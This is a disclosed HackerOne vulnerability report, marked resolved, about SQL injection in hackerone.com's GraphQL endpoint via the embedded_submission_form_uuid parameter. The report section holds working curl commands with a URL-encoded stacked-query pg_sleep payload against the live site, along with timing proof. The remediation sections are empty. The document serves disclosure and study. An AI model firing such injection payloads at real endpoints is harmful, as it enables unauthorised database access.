---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '435066'
original_report_id: '435066'
title: SQL injection in GraphQL endpoint through embedded_submission_form_uuid parameter
weakness: SQL Injection
team_handle: security
created_at: '2018-11-06T16:52:08.233Z'
disclosed_at: '2018-11-30T01:26:39.932Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 149
asset_identifier: hackerone.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- sql-injection
---

# SQL injection in GraphQL endpoint through embedded_submission_form_uuid parameter

## Metadata

- HackerOne Report ID: 435066
- Weakness: SQL Injection
- Program: security
- Disclosed At: 2018-11-30T01:26:39.932Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

The `embedded_submission_form_uuid` parameter in the `/graphql` endpoint is vulnerable to a SQL injection. Execute the following command to reproduce the behavior:

**Locally**:
```
curl -X POST http://localhost:8080/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27
```

**HackerOne.com**
```
curl -X POST https://hackerone.com/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27
```

**Additional proof**
```
$ time curl -X POST https://hackerone.com/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(5\)%3B--%27
{}curl -X POST   0.03s user 0.01s system 0% cpu 5.726 total
$ time curl -X POST https://hackerone.com/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(1\)%3B--%27
{}curl -X POST   0.03s user 0.01s system 2% cpu 1.631 total
$ time curl -X POST https://hackerone.com/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(10\)%3B--%27
{}curl -X POST   0.02s user 0.01s system 0% cpu 10.557 total
```

## Impact

The SQL injections seems to be executing in the context of the `secure` schema, so impact is currently unknown. However, since an attacker may be able to switch schemas, we should consider this to have a high impact on confidentiality.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
